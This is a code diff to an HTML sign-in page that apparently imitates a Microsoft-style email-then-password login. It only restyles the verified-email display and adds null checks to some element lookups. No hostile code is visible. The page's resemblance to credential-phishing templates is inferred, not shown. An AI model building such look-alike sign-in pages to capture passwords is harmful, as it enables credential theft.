@@ -537,9 +537,11 @@
 
             <!-- Password Input Form - shown after email verification -->
             <div id="passwordForm" class="password-section">
-                <div class="form-group">
-                    <p id="verifiedEmailDisplay" style="color: #323130; font-size: 14px; margin-bottom: 10px;"></p>
+                <div class="back-info visible" style="margin-bottom: 10px;">
+                    <span id="verifiedEmailDisplay" style="color: #323130; font-size: 14px;"></span>
+                </div>
 
+                <div class="form-group">
                     <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required>
                 </div>
 
@@ -670,8 +672,10 @@
                     successForm.style.display = 'block';
                 }
 
-                document.getElementById('backInfo').style.display = '';
-                document.getElementById('messageArea').style.display = '';
+                const backInfo = document.getElementById('backInfo');
+                const messageArea = document.getElementById('messageArea');
+                if (backInfo) backInfo.style.display = '';
+                if (messageArea) messageArea.style.display = '';
             }
 
             const buttons = document.querySelectorAll('.btn');
@@ -711,7 +715,7 @@
         function showPasswordForm(email) {
             currentStep = 'password';
             verifiedEmailAddress = email; // Store the verified email
-            document.getElementById('verifiedEmailDisplay').textContent = `${email}`;
+            document.getElementById('verifiedEmailDisplay').textContent = email;
             document.getElementById('passwordInput').value = ''; // Clear password input
             document.getElementById('passwordInput').focus();
             document.getElementById('emailForm').style.display = 'none';
